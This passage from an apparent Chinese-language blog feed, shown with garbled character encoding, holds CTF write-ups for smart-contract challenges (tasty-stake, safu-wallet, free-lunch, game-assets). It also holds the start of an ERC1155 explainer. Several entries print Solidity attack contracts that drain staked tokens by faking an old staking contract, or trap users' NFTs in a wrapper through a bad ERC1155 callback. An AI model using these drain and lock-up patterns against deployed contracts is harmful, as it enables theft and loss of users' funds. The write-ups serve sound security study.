&#123;</span><br><span class="line">        uint256 depositAmount = 1e18 * 1e18; //å¤§é‡çš„FARM</span><br><span class="line">        uint256 shares = rewardsAdvisor.deposit(depositAmount, payable(address(this)), address(this));</span><br><span class="line"></span><br><span class="line">        rewardsAdvisor.withdraw(shares, msg.sender, payable(address(this))); </span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>æ”»å‡»æ€è·¯ï¼šé¦–å…ˆä½¿ç”¨æ”»å‡»åˆçº¦è°ƒç”¨depositå‡½æ•°ï¼Œå­˜å…¥å¤§é‡çš„ä»£å¸ï¼Œç„¶åæ¥æ”¶æ–¹å›è°ƒæ”»å‡»åˆçº¦çš„delegatedTransferERC20å‡½æ•°ï¼Œå‘å®ç°æŠŠä»£å¸è½¬å…¥ã€‚ä½†æ˜¯ï¼Œæ”»å‡»åˆçº¦æ²¡æœ‰å®ç°è¿™delegatedTransferERC20ä¸ªåŠŸèƒ½ï¼Œè€Œè¢«æ”»å‡»çš„åˆçº¦ä¹Ÿå¹¶æ²¡æœ‰æ£€æŸ¥ï¼Œæ‰€ä»¥å°±ç»™æ”»å‡»åˆçº¦å¤§é‡çš„è‚¡ä»½ï¼Œæœ€åå†å®ç°withdrawå‡½æ•°åŠŸèƒ½ï¼Œå°†æ”»å‡»è€…åˆçº¦ä¸­çš„xFARMï¼Œè½¬æ¢å› FARM,å†è½¬ç§»ç»™æ”»å‡»è€…è‡ªå·±ã€‚</p><p>ä¸ªäººè®¤ä¸ºï¼Œå¤–éƒ¨è°ƒç”¨ï¼Œè¦è¿›è¡Œæ£€æŸ¥ï¼Œä¸¥æ ¼çš„å®¡æŸ¥æ˜¯å¦å®ç°äº†åˆç†çš„è¦æ±‚ã€‚</p>]]></content>
      
      
      
        <tags>
            
            <tag> CTF </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>CTF-tasty-stake</title>
      <link href="/2024/10/23/CTF-tasty-stake/"/>
      <url>/2024/10/23/CTF-tasty-stake/</url>
      
        <content type="html"><![CDATA[<h1 id="CTF-tasty-stake"><a href="#CTF-tasty-stake" class="headerlink" title="CTF-tasty-stake"></a>CTF-tasty-stake</h1><p>é¢˜ç›®æºç <a href="https://github.com/0xToshii/mr-steal-yo-crypto-ctf/tree/implement/contracts/tasty-stake">ç‚¹å‡»</a></p><p>é¢˜ç›®è¦æ±‚ï¼š æœ‰ä¸ªTastyStaking åˆçº¦ï¼Œè¯¥åˆçº¦å…è®¸æ‚¨è´¨æŠ¼ STEAK ä»¥ç§æ¤ BUTTER ä»£å¸ã€‚æ‚¨çš„ä»»åŠ¡æ˜¯ä»è´¨æŠ¼åˆçº¦ä¸­è€—å°½æ‰€æœ‰ STEAK ä»£å¸ã€‚</p><p>é¦–å…ˆè¿™ä¸ªåˆçº¦æ˜¯ä¸ªå•åˆçº¦ï¼Œå®ç°çš„åŠŸèƒ½çš„æŒºå¤šçš„ï¼Œé˜…è¯»äº†å¾ˆä¹…ï¼Œçœ‹äº†ä¸€ä¸‹å®ƒçš„æç¤ºï¼šæ‰€æœ‰è¾“å…¥éƒ½ç»è¿‡äº†é€‚å½“çš„éªŒè¯å—ï¼Ÿ</p><p>çœ‹æ¥åˆæ˜¯å‚æ•°æœ‰é—®é¢˜ï¼Œæ¥åˆ°åˆçº¦æœ€åï¼ŒmigrateStakeåˆçº¦å®ç°çš„ä»£å¸è´¨æŠ¼çš„è½¬ç§»</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">function migrateStake(address oldStaking, uint256 amount) external &#123;</span><br><span class="line">        TastyStaking(oldStaking).migrateWithdraw(msg.sender, amount);</span><br><span class="line">        _applyStake(msg.sender, amount);</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p>ä½†æ˜¯å…³é”®æ¥äº†ã€‚å¯¹äºè¿™ä¸ªoldStaking,è¿™ä¸ªå‡½æ•°å¹¶æ²¡æœ‰æœ‰ä»€ä¹ˆæ£€æŸ¥ä¸¾åŠ¨ï¼Œå›æƒ³å‰å‡ å¤©åˆšåšçš„Safu Valuté¢˜ï¼Œå’Œå®ƒæœ‰ç‚¹ç±»ä¼¼ï¼Œéƒ½æ˜¯æ²¡æœ‰å¯¹å¤–éƒ¨è°ƒç”¨è¿›è¡Œä¸€ä¸ªæ£€æŸ¥ï¼Œé‚£ä¹ˆè¿™ä¸ªé¢˜æ—§å¾ˆå¥½çš„è§£å†³äº†</p><p>æ”»å‡»åˆçº¦ï¼š</p><pre><code>contract Attack &#123;     address owner;     TastyStaking _tastyStaking;     Token stakingToken;     constructor(address _target, address _stakingToken)       &#123;         attacker = msg.sender;         _tastyStaking = TastyStaking(_target);          stakingToken = Token(_stakingToken);        &#125;     function migrateWithdraw(address staker, uint256 amount) externa&#123; &#125;         function pwn() external &#123;        //ä¼ å…¥çš„æ”»å‡»åˆçº¦çš„åœ°å€ï¼Œä¹Ÿå°±æ˜¯æ—§åœ°å€ï¼Œ         _tastyStaking.migrateStake(address(this), stakingToken.balanceOf(address(_tastyStaking)));          _tastyStaking.withdrawAll(false);          stakingToken.transfer(attacker, stakingToken.balanceOf(address(this)));          &#125; &#125;è¿™ä¸ªé€»è¾‘å°±æ˜¯ï¼Œæ”»å‡»åˆçº¦ä¼ªè£…æˆæ—§æŠµæŠ¼åˆçº¦åœ°å€ï¼Œå–å¾—TastyStakingåˆçº¦çš„ä¿¡ä»»åï¼Œå†æ‰§è¡Œçš„withdrawallå‡½æ•°å…·ä½“ï¼šæ”»å‡»è€…ä¼ªè£…æˆæ—§åˆçº¦åœ°å€è°ƒç”¨TastyStakingåˆçº¦ä¸­çš„migrateStakeå‡½æ•°ï¼Œç„¶åTastyStakingåˆçº¦æ¥å—åˆ°è½¬ç§»çš„ä¿¡å·ï¼Œåˆå»æ—§åˆçº¦ä¸­è°ƒç”¨migrateWithdrawå‡½æ•°ï¼Œæå–è¢«è½¬ç§»çš„ä»£å¸ï¼Œä½†æ˜¯æ”»å‡»åˆçº¦å¹¶æ²¡æœ‰å®ç°migrateWithdrawå‡½æ•°çš„åŠŸèƒ½ï¼Œè€ŒTastyStakingåˆçº¦ä¹Ÿæ²¡æœ‰è¿›è¡ŒéªŒè¯ï¼Œå°±è¯¯ä»¥ä¸ºæ”¶åˆ°è½¬ç§»çš„ä»£å¸ï¼Œå®é™…æ²¡æœ‰ã€‚è¿™æ ·æ”»å‡»åˆçº¦å–å¾—äº†ä¿¡ä»»ï¼Œç„¶åå°±è°ƒç”¨TastyStakingåˆçº¦ä¸­withdrawallå‡½æ•°ï¼Œè·å¾—äº†TastyStakingåˆçº¦ä¸­çš„æ‰€æœ‰ä»£å¸ã€‚</code></pre>]]></content>
      
      
      
        <tags>
            
            <tag> CTF </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>CTF-safu-wallet</title>
      <link href="/2024/10/23/CTF-safu-wallet/"/>
      <url>/2024/10/23/CTF-safu-wallet/</url>
      
        <content type="html"><![CDATA[<h1 id="CTF-safu-wallet"><a href="#CTF-safu-wallet" class="headerlink" title="CTF-safu-wallet"></a>CTF-safu-wallet</h1><p>é¢˜ç›®æºç <a href="https://github.com/0xToshii/mr-steal-yo-crypto-ctf/tree/implement/contracts/safu-wallet">ç‚¹å‡»</a>ã€‚</p><p>é¢˜ç›®è¦æ±‚ï¼šè¿™æ˜¯ä¸€ä¸ªå¤šç­¾åé’±åŒ…ï¼Œå·²ç»æœ‰ä¸€ä½é¡¾å®¢å­˜å…¥é’±ï¼Œç„¶åä½ è¦å°†å®ƒçš„é’±æ°¸è¿œå›°ä½åœ¨è¿™ä¸ªé’±åŒ…é‡Œ</p><p>é¦–å…ˆçœ‹åˆ°åˆçº¦ä»£ç ï¼šå¾ˆæ¸…æ™°çš„è¾¨åˆ«äº†ï¼ŒSafuWalletåˆçº¦æ˜¯ä»£ç†åˆçº¦ï¼ŒSafuWalletLibraryåˆçº¦æ˜¯é€»è¾‘åˆçº¦ï¼Œè¿™æ ·åˆ†å¼€ï¼Œå°±å¥½ç†è§£äº†<br>å¯¹äºå¤šç­¾åé’±åŒ…ï¼Œæˆ‘çš„ç†è§£å°±æ˜¯ï¼Œä¸æ­¢ä¸€ä¸ªç®¡ç†å‘˜ï¼Œè‡³å°‘è¦ä¿©ä¸ªç®¡ç†å‘˜å°±å¯ä»¥ç®¡ç†è¿™ä¸ªé’±åŒ…äº†ã€‚</p><p>é€»è¾‘åˆçº¦é‡Œæœ‰killå‡½æ•°ï¼Œå¦‚æœèƒ½è°ƒç”¨ï¼Œè¿™åº”è¯¥æ˜¯æœ€ä¾¿æ·çš„è§£é¢˜æ–¹å¼äº†</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">function kill(address _to) onlymanyowners(sha3(msg.data)) external &#123;</span><br><span class="line">    suicide(_to);</span><br><span class="line">  &#125;</span><br></pre></td></tr></table></figure><p>å¾ˆé—æ†¾çš„æ˜¯ï¼Œæœ‰ä¸ª<code>onlymanyowners</code>é™åˆ¶ï¼Œè¿™ä¹Ÿå°±æ˜¯å¤šç­¾åé’±åŒ…çš„é­…åŠ›äº†å§ã€‚</p><p>çœ‹åˆ°ä»£ç†åˆçº¦ä¸­ï¼Œæ„é€ å‡½æ•°è¿˜æ˜¯æœ‰ç‚¹ä¸œè¥¿ã€‚</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">constructor(address[] memory _owners, uint _required, uint _daylimit) &#123;</span><br><span class="line">   bytes memory data = abi.encodeWithSignature(</span><br><span class="line">     &quot;initWallet(address[],uint256,uint256)&quot;,</span><br><span class="line">     _owners,</span><br><span class="line">     _required,</span><br><span class="line">     _daylimit</span><br><span class="line">   );</span><br><span class="line"></span><br><span class="line">   _safuWalletLibrary.functionDelegateCall(data);</span><br><span class="line"> &#125;</span><br></pre></td></tr></table></figure><p>åˆæ˜¯ç†Ÿæ‚‰çš„<code>delegatecall</code>,ä»£ç†åˆçº¦å§”æ‰˜è°ƒç”¨äº†é€»è¾‘åˆçº¦é‡Œçš„initWalletå‡½æ•°ï¼Œæ‰§è¡Œç¯å¢ƒæ˜¯åœ¨ä»£ç†åˆçº¦ï¼Œæ”¹å˜çš„çŠ¶æ€å˜é‡ä¹Ÿæ˜¯åœ¨ä»£ç†åˆçº¦ä¸­ï¼Œä¹Ÿå°±æ˜¯è¯´åœ¨ä»£ç†åˆçº¦ä¸­ï¼Œè¿™ä¸ªæ‰€æœ‰è€…æ˜¯å¯ä»¥æ”¹å˜çš„ï¼Œå¦‚æœåªæœ‰æˆ‘ä»¬è‡ªå·±ï¼Œé‚£ä¹ˆå°±å¯ä»¥æˆä¸ºå¤šç­¾åé’±åŒ…çš„å”¯ä¸€æ‰€æœ‰è€…ï¼Œç„¶åå†è°ƒç”¨é€»è¾‘åˆçº¦é‡Œçš„killå‡½æ•°ï¼Œä¼ å…¥ä»£ç†åˆçº¦çš„åœ°å€ï¼Œé”€æ¯å®ƒï¼Œè¿™æ ·å°±ä¸éœ€è¦å…¶ä»–äººçš„æ‰€æœ‰è€…çš„åŒæ„ï¼Œå°±å¯ä»¥é”€æ¯ï¼Œé‚£ä½å­˜é’±çš„äººï¼Œæƒ³è¦å–é’±ï¼Œæ˜¯ä¸è¡Œçš„ã€‚</p><p>è¿˜æœ‰ä¸€ç§æƒ…å†µå°±æ˜¯æŠŠæ‰€æœ‰è€…åˆ—è¡¨éƒ½è®¾ç½®ä¸ºç©ºï¼Œç„¶åå†è°ƒç”¨killå‡½æ•°æ—¶å°±æ²¡æœ‰ä»»ä½•æ‰€æœ‰è€…ç¡®è®¤äº†ã€‚</p><p>æ”»å‡»æ€è·¯ï¼š<br>æ”¹å˜æ‰€æœ‰è€…çš„åˆ—è¡¨ï¼Œå°†ä»–ä»¬è®¾ç½®ä¸ºç©ºã€‚è°ƒç”¨<code>safuWalletLibrary.initWallet(addresses(0), 1, type(uint).max)</code>,è®¾ç½®è¦æ±‚ï¼Œåªéœ€è¦ä¸€ä¸ªç¡®è®¤å°±å¯ä»¥æ‰§è¡Œæ“ä½œã€‚æœ€åè°ƒç”¨killå‡½æ•°ï¼Œå³å¯ã€‚</p><p>ä¸ªäººè®¤ä¸ºï¼šå°±æ˜¯é€»è¾‘åˆçº¦é‡Œçš„killå‡½æ•°æ²¡æœ‰ä»»ä½•é™åˆ¶ï¼Œåªè¦æ‰€æœ‰è€…åˆ—è¡¨ä¸ºç©ºï¼Œæˆ–è€…æ”»å‡»è€…æˆä¸ºäº†æ‰€æœ‰è€…ï¼Œéƒ½å¯ä»¥è°ƒç”¨ã€‚</p>]]></content>
      
      
      
        <tags>
            
            <tag> CTF </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>CTF-free-Lunch</title>
      <link href="/2024/10/23/CTF-free-Lunch/"/>
      <url>/2024/10/23/CTF-free-Lunch/</url>
      
        <content type="html"><![CDATA[<h1 id="CTF-free-Lunch"><a href="#CTF-free-Lunch" class="headerlink" title="CTF-free-Lunch"></a>CTF-free-Lunch</h1><p>é¢˜ç›®æ¥æºï¼š<a href="https://github.com/0xToshii/mr-steal-yo-crypto-ctf/tree/implement/contracts/free-lunch">ç‚¹å‡»</a></p><p>é¦–å…ˆè¿™ä¸ªä»£å¸åªæœ‰ä¸€ä¸ªåˆçº¦ï¼Œè¿˜æ˜¯å®¹æ˜“ç†è§£ã€‚å¦‚æœå¯¹<code>unswap V2</code>æœ‰äº†è§£çš„è¯ï¼Œä¼šæ›´å¥½çš„ç†è§£åˆçº¦ã€‚å‘ç°æ¼æ´ã€‚<br>è¦äº†è§£æµåŠ¨æ± <a href="https://www.binance.com/zh-CN/square/post/139279">ç‚¹å‡»</a>,</p><p>é¢˜ç›®è¦æ±‚æ˜¯ï¼šæˆ‘ä»¬åˆå§‹æœ‰ä¿©ä¸ªä»£å¸ï¼Œè®©æˆ‘ä»¬é€šè¿‡è¿™ä¸ªSafuMakeråˆçº¦åï¼Œç¿»å€50ï¼Œå¹¶ä¸”è¦è€—å°½è¿™ä¸ªåˆçº¦çš„èµ„é‡‘ã€‚</p><p>æ”»å‡»æµç¨‹ï¼ˆè¿™é“é¢˜æ²¡æœ‰æ€è·¯ï¼Œæˆ–è€…æ˜¯è¯´å¯¹æµåŠ¨æ€§çš„äº†è§£å¤ªå°‘äº†ï¼Œçœ‹äº†æµ‹è¯•åˆçº¦ï¼Œå‘ç°è¿™ä¸ªæ€è·¯çœŸçš„è®©æˆ‘èŒ…èˆé¡¿å¼€ï¼Œæˆ–è€…æ˜¯ï¼Œé¢˜ç›®è¿˜æ˜¯åšå°‘äº†ï¼‰ï¼š</p><p>æ·»åŠ æµåŠ¨æ€§å¹¶è·å¾— LP ä»£å¸ï¼š</p><ul><li>æ”»å‡»è€…é¦–å…ˆå‘ SAFU-USDC æµåŠ¨æ€§æ± æ·»åŠ æµåŠ¨æ€§ï¼Œä¾‹å¦‚å­˜å…¥ 10 USDC å’Œ 10 SAFUã€‚è¿™ä¸€æ­¥ä½¿å¾—æ”»å‡»è€…è·å¾—ç›¸åº”æ•°é‡çš„ LP ä»£å¸ï¼Œä»£è¡¨ä»–ä»¬åœ¨æµåŠ¨æ€§æ± ä¸­çš„ä»½é¢ã€‚</li></ul><p>åˆ›å»ºæ–°æµåŠ¨æ€§æ± ï¼š</p><ul><li>æ”»å‡»è€…ä½¿ç”¨è·å¾—çš„ LP ä»£å¸ä¸ SAFU ä»£å¸åˆ›å»ºä¸€ä¸ªæ–°çš„æµåŠ¨æ€§æ± ã€‚è¿™ä¸€æ­¥å¢åŠ äº†æ”»å‡»è€…çš„æµåŠ¨æ€§æ§åˆ¶èƒ½åŠ›ã€‚</li></ul><p>è½¬ç§» LP ä»£å¸å¹¶è¿›è¡Œè½¬æ¢ï¼š</p><ul><li>æ”»å‡»è€…å°† 10% çš„æ–°æµåŠ¨æ€§æ± çš„ LP ä»£å¸è½¬ç§»åˆ° safuMaker åˆçº¦ï¼Œå¹¶è°ƒç”¨å…¶ convert æ–¹æ³•ã€‚è¿™é€šå¸¸ä¼šæ¿€æ´»ä¸€äº›æœºåˆ¶ï¼Œä¾‹å¦‚å°† LP ä»£å¸è½¬æ¢ä¸º SAFU ä»£å¸æˆ–å…¶ä»–å¥–åŠ±ã€‚</li></ul><p>ä»£å¸äº¤æ¢ï¼š</p><ul><li>æ”»å‡»è€…ä½¿ç”¨è·¯ç”±åˆçº¦æ‰§è¡Œä»£å¸äº¤æ¢ï¼Œå°† SAFU ä»£å¸è½¬æ¢ä¸º SAFU-Pair LP ä»£å¸ã€‚è¿™ä¸€æ­¥éª¤å…è®¸æ”»å‡»è€…åˆ©ç”¨ä»·æ ¼å·®å¼‚è·å–æ›´å¤šçš„ LP ä»£å¸ã€‚</li></ul><p>ç§»é™¤æµåŠ¨æ€§å¹¶æå–èµ„äº§ï¼š</p><ul><li>æ”»å‡»è€…ç§»é™¤æµåŠ¨æ€§æ± ä¸­çš„æ‰€æœ‰èµ„äº§ï¼Œè¿™ä¼šå°†ä»–ä»¬çš„ LP ä»£å¸è½¬æ¢ä¸ºåŸºç¡€çš„ USDC å’Œ SAFU ä»£å¸ã€‚<br>ç”±äºåœ¨æµåŠ¨æ€§æ± ä¸­ä¸æ–­è¿›è¡Œäº¤æ˜“ã€æä¾›æµåŠ¨æ€§ä»¥åŠè·å–å¥–åŠ±ï¼Œæ”»å‡»è€…çš„æœ€ç»ˆä½™æœ€ç»ˆä½™é¢å¤§å¹…å¢åŠ ã€‚</li></ul><p>æ”»å‡»è€…æˆåŠŸçš„å…³é”®åœ¨äºå¯¹æµåŠ¨æ€§æ± æœºåˆ¶çš„åˆ©ç”¨ï¼Œé€šè¿‡ä¸æ–­æ·»åŠ æµåŠ¨æ€§ã€è½¬ç§» LP ä»£å¸å’Œè¿›è¡Œä»£å¸äº¤æ¢ï¼Œæ”»å‡»è€…èƒ½å¤Ÿæœ‰æ•ˆå¢åŠ å…¶ä»£å¸ä½™é¢ï¼Œæœ€ç»ˆå®ç°ç»æµåˆ©ç›Šçš„è·å–ã€‚</p><p>ä¸ªäººè®¤ä¸ºå°±åƒæ— ä¸­ç”Ÿæœ‰ä¸€æ ·ï¼Œæ›´åƒä¸€ç§æ¬ºéª—ï¼Œä¸è¿‡è¿™æ ·ç¡®å®ä¹Ÿèƒ½è·åˆ©</p>]]></content>
      
      
      
        <tags>
            
            <tag> CTF </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>CTF-game-assets</title>
      <link href="/2024/10/22/CTF-game-assets/"/>
      <url>/2024/10/22/CTF-game-assets/</url>
      
        <content type="html"><![CDATA[<h1 id="CTF-game-asserts"><a href="#CTF-game-asserts" class="headerlink" title="CTF-game-asserts"></a>CTF-game-asserts</h1><p>é¢˜ç›®æºç :<a href="https://github.com/0xToshii/mr-steal-yo-crypto-ctf/tree/implement/contracts/game-assets">ç‚¹å‡»</a></p><p>é¢˜ç›®è¯´æ˜ï¼šGG labs åˆšåˆšå‘å¸ƒäº†ä»–ä»¬çš„ nOtApOnZi æ¸¸æˆï¼Œè¯¥æ¸¸æˆå…è®¸å°†å¤šä¸ª WLed NFT ç”¨ä½œæ¸¸æˆå†…ç‰©å“ã€‚ä¸ºäº†é›†æˆå¤šä¸ª ERC721 ä»£å¸ï¼Œä»–ä»¬æœ‰ä¸€ä¸ªåŒ…è£…åˆçº¦ ï¼ˆERC1155ï¼‰ æ¥åŒ…è£… NFTï¼Œå…è®¸å®ƒä»¬åœ¨æ¸¸æˆä¸­ä½¿ç”¨ã€‚ç”¨æˆ·ä¹Ÿå¯ä»¥åœ¨ä½¿ç”¨å®Œ NFT åè§£åŒ…å®ƒä»¬ã€‚æ‚¨çš„ä»»åŠ¡æ˜¯å°†ç”¨æˆ·çš„ NFT å›°åœ¨åŒ…è£…åˆçº¦ä¸­å¹¶ä½¿ä»–ä»¬æ— æ³•æŒ½å›ï¼Œä»è€Œä½¿ç”¨æˆ·æ„Ÿåˆ°æ‚²ä¼¤</p><p>è¿™ä¸ªä¸€å®ç°äº†æ¸¸æˆé‡Œçš„èµ„äº§è½¬åŒ–ï¼Œé¦–å…ˆAssetHolderåˆçº¦ä¸­ï¼Œå°±æ˜¯èµ„äº§çš„è¯´æ˜ï¼Œå…·ä½“å®ç°æœ‰ç‚¹å¤šï¼Œè¿™é‡Œå°±ä¸æ·±ç©¶äº†ï¼ŒAssetWrapperåˆçº¦å°±æ˜¯æˆ‘ä»¬é‡ç‚¹è¦è¯´çš„äº†ï¼Œä»–æ˜¯ä¸€ä¸ªåŒ…è£…åˆçº¦ï¼Œå› ä¸ºè¿™ä¸ªæ¸¸æˆä½¿ç”¨çš„ERC1155ä»£å¸è§„åˆ™ï¼Œæ‰€ä»¥åœ¨è¿›è¡ŒåŒ…è£…çš„æ—¶å€™ï¼Œè¦å¯¹ç”¨æˆ·è¿›è¡Œè¿”å›ä»£å¸æ˜¯ï¼Œå°±ä¼šè§¦å‘ä¸€ä¸ªéšè—çš„æ¥å—å‡½æ•°ï¼Œ</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">function onERC1155BatchReceived(</span><br><span class="line">       address operator,</span><br><span class="line">       address from,</span><br><span class="line">       uint256[] calldata ids,</span><br><span class="line">       uint256[] calldata values,</span><br><span class="line">       bytes calldata data</span><br><span class="line">   ) external override returns (bytes4) &#123; &#125;</span><br></pre></td></tr></table></figure><p>bytes4è¿”å›å€¼æ˜¯å›ºå®šçš„ï¼Œå¦‚æœå°±æ˜¯åœ¨è¿”å›å€¼è¿™é‡ŒåŠ¨æ‰‹è„šäº†ï¼Œé‚£ä¹ˆåŒ…è£…å°±ä¼šä¸æˆåŠŸï¼Œèµ„äº§å°±ä¼šè¢«å›°ä½ã€‚</p><p>è¿™ä¸ªé¢˜è¦å…ˆå»äº†è§£ERC1155ä»£å¸æ ‡å‡†ï¼Œæˆ‘è‡ªå·±å¯¹äºè¿™ä¸ªERC-1155çš„äº†è§£<a href="ERC1155.md">ç‚¹å‡»</a>,æ¼æ´å·²åœ¨è¿™é‡Œé¢è¯´æ˜ï¼Œå°±æ˜¯ä¸€ä¸ªå¿…é¡»æ³¨æ„çš„åœ°æ–¹ï¼Œæˆ‘è§‰å¾—ä¹Ÿæ˜¯ERC1155çš„ä¸€ä¸ªå¼Šç«¯å§</p><p>æ”»å‡»ä»£ç å¦‚ä¸‹ï¼š</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">//SPDX-Linsence-Identifier: MIT</span><br><span class="line"></span><br><span class="line">pragma solidity^ 0.8.17;</span><br><span class="line"></span><br><span class="line">import &quot;@openzeppelin/contracts/token/ERC1155/utils/ERC1155Receiver.sol&quot;;</span><br><span class="line"></span><br><span class="line">interface AssetWrapper &#123;</span><br><span class="line">    function wrap(uint256 nftId,address assetOwner,address assetAddress) external;</span><br><span class="line">    function unwrap (address assetOwner,address assetAddress) external ;</span><br><span class="line">&#125;</span><br><span class="line">contract Hack is ERC1155Receiver&#123;</span><br><span class="line">          IAssetWrapper wrapper;</span><br><span class="line">          address attracker;</span><br><span class="line">           address nftAddress;</span><br><span class="line"></span><br><span class="line">           constructor(address _wrapper,address _attracker)&#123;</span><br><span class="line">            wrapper = IAssetWrapper(_wrapper);</span><br><span class="line">            attracker = attracker;</span><br><span class="line">           &#125;</span><br><span class="line"></span><br><span class="line">           function pwn(uint256 nftId,address assetAddress) exteranl&#123;</span><br><span class="line">             nftAddress = assetAddress;</span><br><span class="line">             wrapper.wrap(nftId,address(this),assetAddress);</span><br><span class="line"></span><br><span class="line">           &#125;</span><br><span class="line"></span><br><span class="line">           function onERC1155Received(address operator,address from,address id,uint256 value,bytes calldata)</span><br><span class="line">           exteranl returns(bytes4)&#123;</span><br><span class="line">             require(msg.sender == address(wrapper), &quot;invalid callback&quot;);</span><br><span class="line"></span><br><span class="line">               wrapper.unwrap(address(this), nftAddress); // change ownership to this contract</span><br><span class="line"></span><br><span class="line">                 return bytes4(keccak256(&quot;onERC1155Received(address,address,uint256,uint256,bytes)&quot;));</span><br><span class="line">           &#125;</span><br><span class="line">           function onERC1155BatchReceived(</span><br><span class="line">        address operator,</span><br><span class="line">        address from,</span><br><span class="line">        uint256[] calldata ids,</span><br><span class="line">        uint256[] calldata values,</span><br><span class="line">        bytes calldata data</span><br><span class="line">    ) external override returns (bytes4) &#123;</span><br><span class="line">        return bytes4(0); // è¿”å›äº†bytes(0),ä¸æœ¬æ¥æ ‡å‡†ä¸ç¬¦åˆã€‚</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>å³å¯ï¼Œä¸ªäººè®¤ä¸ºè¿™é“é¢˜çš„è€ƒå¯Ÿç‚¹å°±æ˜¯å¯¹ERC1155ä»£å¸è§„åˆ™è¦ç†Ÿæ‚‰ã€‚</p>]]></content>
      
      
      
        <tags>
            
            <tag> CTF </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>ERC1155</title>
      <link href="/2024/10/22/ERC1155/"/>
      <url>/2024/10/22/ERC1155/</url>
      
        <content type="html"><![CDATA[<h1 id="ERC1155"><a href="#ERC1155" class="headerlink" title="ERC1155"></a>ERC1155</h1><p>å¤šä»£å¸æ ‡å‡†</p><h2 id="ç®€ä»‹"><a href="#ç®€ä»‹" class="headerlink" title="ç®€ä»‹"></a>ç®€ä»‹</h2><p>ç”¨äºå¤šç§ä»£å¸ç®¡ç†çš„åˆçº¦æ ‡å‡†æ¥å£ã€‚ å•ä¸ªéƒ¨ç½²çš„åˆçº¦å¯ä»¥åŒ…æ‹¬åŒè´¨åŒ–ä»£å¸ã€éåŒè´¨åŒ–ä»£å¸æˆ–å…¶ä»–é…ç½®ï¼ˆå¦‚åŠåŒè´¨åŒ–ä»£å¸ï¼‰çš„ä»»ä½•ç»„åˆã€‚</p><p>å¤šä»£å¸æ ‡å‡†æ˜¯ä»€ä¹ˆï¼Ÿ</p><p>å®ƒçš„ç›®çš„å¾ˆå•çº¯ï¼Œå°±æ˜¯åˆ›å»ºä¸€ä¸ªæ™ºèƒ½åˆçº¦æ¥å£ï¼Œå¯ä»¥ä»£è¡¨å’Œæ§åˆ¶ä»»ä½•æ•°é‡çš„åŒè´¨åŒ–å’ŒéåŒè´¨åŒ–ä»£å¸ç±»å‹ã€‚ è¿™æ ·ä¸€æ¥ï¼ŒERC-1155 ä»£å¸å°±å…·æœ‰ä¸ ERC-20 å’Œ ERC-721 ä»£å¸ç›¸åŒçš„åŠŸèƒ½ï¼Œç”šè‡³å¯ä»¥åŒæ—¶ä½¿ç”¨è¿™ä¸¤è€…çš„åŠŸèƒ½ã€‚ å®ƒæ”¹è¿›äº† ERC-20 å’Œ ERC-721 æ ‡å‡†çš„åŠŸèƒ½ï¼Œæå‡äº†æ•ˆç‡å¹¶çº æ­£äº†å®ç°ä¸­çš„æ˜æ˜¾é”™è¯¯ã€‚</p><h2 id="åŠŸèƒ½"><a href="#åŠŸèƒ½" class="headerlink" title="åŠŸèƒ½"></a>åŠŸèƒ½</h2><h3 id="æ‰¹é‡ä¼ è¾“"><a href="#æ‰¹é‡ä¼ è¾“" class="headerlink" title="æ‰¹é‡ä¼ è¾“"></a>æ‰¹é‡ä¼ è¾“</h3><p>é€šè¿‡ä¸€æ¬¡åˆçº¦è°ƒç”¨ä¼ è¾“å¤šç§èµ„äº§</p><p>å°±æ˜¯ä¸å•æ˜¯ä¸€ç§ä»£å¸å¯ä»¥ä¼ è¾“ï¼Œå¾ˆå¤šç§ä»£å¸éƒ½å¯ä»¥ä¼ è¾“</p><p>æ¥çœ‹çœ‹ï¼Œä»–ä¸ERC20ä¼ è¾“åˆçº¦çš„æ¯”è¾ƒ</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">// ERC-20</span><br><span class="line">function transferFrom(address from, address to, uint256 value) external returns (bool);</span><br><span class="line"></span><br><span class="line">// ERC-1155</span><br><span class="line">function safeBatchTransferFrom(</span><br><span class="line">    address _from,</span><br><span class="line">    address _to,</span><br><span class="line">    uint256[] calldata _ids,</span><br><span class="line">    uint256[] calldata _values,</span><br><span class="line">    bytes calldata _data</span><br><span class="line">) external;</span><br></pre></td></tr></table></figure><p>ERC-1155 ä¸­å”¯ä¸€çš„åŒºåˆ«æ˜¯æˆ‘ä»¬å°†å€¼ä½œä¸ºæ•°ç»„ä¼ é€’ï¼ŒåŒæ—¶ä¹Ÿä¼ é€’äº† ids æ•°ç»„ã€‚ ä¾‹å¦‚ï¼Œç»™å‡º ids&#x3D;[3, 6, 13] å’Œ values&#x3D;[100, 200, 5]ï¼Œä¼ è¾“ç»“æœå°†æ˜¯</p><ul><li>å°† id 3 çš„ 100 ä¸ªä»£å¸ä» _from ä¼ è¾“åˆ° _toã€‚</li><li>å°† id 6 çš„ 200 ä¸ªä»£å¸ä» _from ä¼ è¾“åˆ° _toã€‚</li><li>å°† id 13 çš„ 5 ä¸ªä»£å¸ä» _from è½¬ç§»åˆ° _toã€‚<br>åœ¨ ERC-1155 ä¸­ï¼Œæˆ‘ä»¬åªæœ‰ transferFromï¼Œæ²¡æœ‰ transferã€‚ è¦åƒå¸¸è§„çš„ transferä¸€æ ·ä½¿ç”¨å®ƒï¼Œåªéœ€å°† â€œfromâ€ åœ°å€è®¾ä¸ºè°ƒç”¨è¯¥å‡½æ•°çš„åœ°å€ã€‚</li></ul><h3 id="æ‰¹é‡ä½™é¢"><a href="#æ‰¹é‡ä½™é¢" class="headerlink" 